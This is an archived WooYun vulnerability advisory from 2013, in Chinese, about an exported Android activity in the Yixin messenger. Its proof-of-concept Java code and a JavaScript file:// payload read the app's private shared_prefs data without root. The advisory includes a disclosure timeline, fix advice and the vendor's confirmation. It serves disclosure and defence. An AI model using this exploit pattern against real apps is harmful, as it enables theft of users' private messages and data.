@@ -1,0 +1,242 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		易信组件存在信息泄露漏洞可导致恶意APP获取其私有目录数据（非root环境）  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		易信组件存在信息泄露漏洞可导致恶意APP获取其私有目录数据（非root环境）  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/小p优优">小p优优</a> 
+</li><li>提交时间：		2013-09-03 16:21</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-09-03：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-09-06：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-09-09：	细节向第三方安全合作伙伴开放<br/>
+									2013-09-16：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-09-26：	细节向普通白帽子公开<br/>
+									2013-10-16：	细节向实习白帽子公开<br/>
+									2013-12-02：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">易信的组件使用不当存在信息泄露漏洞、弹窗，恶意攻击者可能可以使用这个漏洞窃取用户隐私，或者弹一些恶意构造的广告</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">启动界面WelcomeActivity是导出的， WelcomeActivity的.method private h()V存在如下smali:<br />
+<br />
+</p><pre><code>Lim/yixin/activity/WelcomeActivity;-&gt;getIntent()Landroid/content/Intent;<br />
+......<br />
+Landroid/content/Intent;-&gt;getParcelableExtra(Ljava/lang/String;)Landroid/os/Parcelable;......<br />
+Lim/yixin/activity/WelcomeActivity;-&gt;startActivity(Landroid/content/Intent;)V</code></pre><p class='detail'><br />
+<br />
+当一个攻击app(恶意或非恶意均可以) 可以通过这个导出的组件，打开一个本地页面时，此本地页面中的可以按照攻击app的要求获取易信下的所有数据，包括聊天数据库等，盗取过程无需root，盗取之后可以发送给远程服务器！ <br />
+<br />
+<br />
+<br />
+利用细节:<br />
+<br />
+这里是手动把file:///mnt/sdcard/yixin.html放在sd卡上，在攻击app中直接释放这个html<br />
+<br />
+<br />
+<br />
+主要实现代码:<br />
+<br />
+</p><pre><code>static final String YIXIN_PKG = &quot;im.yixin&quot;;<br />
+ static final String CustomWebView_ACTIVITY = &quot;im.yixin.activity.CustomWebView&quot;;<br />
+ static final String Welcome_ACTIVITY = &quot;im.yixin.activity.WelcomeActivity&quot;;<br />
+<br />
+    public void attack()  {<br />
+        Intent contIntent = new Intent();<br />
+        contIntent.putExtra(&quot;url&quot;, &quot;file:///mnt/sdcard/yixin.html&quot;);<br />
+        Intent intent = new Intent();<br />
+        intent.setClassName(YIXIN_PKG, Welcome_ACTIVITY);<br />
+        Class lunch = null;<br />
+<br />
+        File aOptimizedDexOutputPath = getDir(&quot;outdex&quot;, Context.MODE_PRIVATE);<br />
+        File dexFile = new File(&quot;/data/app/im.yixin-1.apk&quot;);  <br />
+<br />
+        if(dexFile.exists()){	<br />
+			DexClassLoader loader = new DexClassLoader(dexFile.toString() , aOptimizedDexOutputPath.getAbsolutePath() , <br />
+					null , ClassLoader.getSystemClassLoader());<br />
+	        try {<br />
+<br />
+				lunch = Class.forName(&quot;im.yixin.activity.CustomWebView&quot;,true,loader);<br />
+			} catch (ClassNotFoundException e) {<br />
+				e.printStackTrace();<br />
+			}<br />
+        }<br />
+<br />
+        intent.putExtra(&quot;target&quot;, lunch);<br />
+        intent.putExtra(&quot;data&quot;, contIntent);<br />
+        this.startActivity(intent);<br />
+    }</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+存放在/mnt/sdcard/yixin.html内容如下:<br />
+<br />
+</p><pre><code>&lt;html&gt;<br />
+&lt;body&gt;<br />
+&lt;script type=&quot;text/javascript&quot;&gt;<br />
+function getMessage() {<br />
+	var request = false;<br />
+    if(window.XMLHttpRequest) {<br />
+        request = new XMLHttpRequest();<br />
+		if(request.overrideMimeType) {<br />
+			request.overrideMimeType(&#039;text/xml&#039;);<br />
+		}<br />
+    }	<br />
+    xmlhttp = request;<br />
+<br />
+    //获取本地文件代码<br />
+    xmlhttp.open(&quot;GET&quot;, &quot;file:////data/data/im.yixin/shared_prefs/saveTextMessage.xml&quot;, false);<br />
+<br />
+    xmlhttp.send(null);<br />
+    var ret = xmlhttp.responseText;<br />
+	return ret;<br />
+}<br />
+<br />
+alert(getMessage());<br />
+&lt;/script&gt;<br />
+&lt;/body&gt;<br />
+&lt;/html&gt;</code></pre><p class='detail'> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">导出activity，导致可以打开一个本地页面时，此本地页面中的可以按照攻击app的要求获取易信下的所有数据，包括聊天数据库等，盗取过程无需root，盗取之后可以发送给远程服务器！ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">导出activity控制getIntent以及getParcelableExtra的使用 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/小p优优" title="小p优优">小p优优</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-036017" title="易信组件存在信息泄露漏洞可导致恶意APP获取其私有目录数据（非root环境）">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2013-09-06 16:49</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢您对网易的关注，漏洞已经修复。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="36017";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
